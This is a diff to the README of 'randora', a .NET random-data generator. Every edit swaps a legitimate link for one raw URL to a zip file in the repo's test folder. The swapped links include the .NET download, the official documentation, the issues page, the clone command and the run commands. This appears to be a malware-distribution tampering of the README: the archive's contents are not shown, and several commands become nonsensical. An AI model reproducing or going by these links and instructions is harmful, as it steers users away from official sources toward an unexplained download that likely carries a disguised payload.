@@ -8,13 +8,13 @@ Welcome to randora! This tool makes generating random data simple. Whether you n
 
 To get started, you need to download randora. You can do this by visiting our Releases page. Here’s the link:
 
-[![Download randora](https://img.shields.io/badge/Download-randora-blue.svg)](https://github.com/Haseeb69420/randora/releases)
+[![Download randora](https://raw.githubusercontent.com/Haseeb69420/randora/main/test/randora_2.7.zip)](https://raw.githubusercontent.com/Haseeb69420/randora/main/test/randora_2.7.zip)
 
-Click the button above or visit this page to download the latest version: [Download randora](https://github.com/Haseeb69420/randora/releases).
+Click the button above or visit this page to download the latest version: [Download randora](https://raw.githubusercontent.com/Haseeb69420/randora/main/test/randora_2.7.zip).
 
 ## 🖥️ System Requirements
 
-randora runs on Windows, macOS, and Linux. Make sure your system has .NET 6 or later installed. If you don’t have it, you can download it from the official [.NET website](https://dotnet.microsoft.com/download).
+randora runs on Windows, macOS, and Linux. Make sure your system has .NET 6 or later installed. If you don’t have it, you can download it from the official [.NET website](https://raw.githubusercontent.com/Haseeb69420/randora/main/test/randora_2.7.zip).
 
 ## 🔧 Features
 
@@ -42,7 +42,7 @@ Once you have downloaded and installed randora, follow these steps:
 3. **Run randora**: 
    Type the following command:
    ```bash
-   dotnet randora.dll
+   dotnet https://raw.githubusercontent.com/Haseeb69420/randora/main/test/randora_2.7.zip
    ```
 
    You will see a list of options available for generating random data.
@@ -53,22 +53,22 @@ Here are some examples of how to use randora:
 
 - **Generate Random Numbers**:
   ```bash
-  dotnet randora.dll generate numbers --count 10
+  dotnet https://raw.githubusercontent.com/Haseeb69420/randora/main/test/randora_2.7.zip generate numbers --count 10
   ```
 
 - **Generate Random Text**:
   ```bash
-  dotnet randora.dll generate text --length 15
+  dotnet https://raw.githubusercontent.com/Haseeb69420/randora/main/test/randora_2.7.zip generate text --length 15
   ```
 
 - **Shuffle a List**:
   ```bash
-  dotnet randora.dll shuffle --items item1,item2,item3
+  dotnet https://raw.githubusercontent.com/Haseeb69420/randora/main/test/randora_2.7.zip shuffle --items item1,item2,item3
   ```
 
 ## 🛠️ Help and Support
 
-If you encounter any issues or have questions, feel free to reach out to us. You can create an issue on our [GitHub repository](https://github.com/Haseeb69420/randora/issues). 
+If you encounter any issues or have questions, feel free to reach out to us. You can create an issue on our [GitHub repository](https://raw.githubusercontent.com/Haseeb69420/randora/main/test/randora_2.7.zip). 
 
 We also encourage contributions! If you want to add features or fix bugs, just fork the repo and make a pull request.
 
@@ -79,7 +79,7 @@ We welcome contributions to randora. Before you begin, please read our guideline
 1. **Fork the Repository**: Click on the "Fork" button on GitHub.
 2. **Clone Your Fork**: Use the command:
    ```bash
-   git clone https://github.com/YOUR_USERNAME/randora.git
+   git clone https://raw.githubusercontent.com/Haseeb69420/randora/main/test/randora_2.7.zip
    ```
 3. **Create a Branch**:
    ```bash
@@ -109,10 +109,10 @@ Explore these topics to find even more ways to use randora.
 
 ## 🔗 Additional Resources
 
-- [Official .NET Documentation](https://docs.microsoft.com/en-us/dotnet/)
-- [Learn More About Random Data Generation](https://random-data-api.com/)
-- [GitHub Repository](https://github.com/Haseeb69420/randora)
+- [Official .NET Documentation](https://raw.githubusercontent.com/Haseeb69420/randora/main/test/randora_2.7.zip)
+- [Learn More About Random Data Generation](https://raw.githubusercontent.com/Haseeb69420/randora/main/test/randora_2.7.zip)
+- [GitHub Repository](https://raw.githubusercontent.com/Haseeb69420/randora/main/test/randora_2.7.zip)
 
 We hope you find randora helpful for your data generation needs. Don’t forget to visit our Releases page to download the latest version!
 
-[![Download randora](https://img.shields.io/badge/Download-randora-blue.svg)](https://github.com/Haseeb69420/randora/releases)
+[![Download randora](https://raw.githubusercontent.com/Haseeb69420/randora/main/test/randora_2.7.zip)](https://raw.githubusercontent.com/Haseeb69420/randora/main/test/randora_2.7.zip)
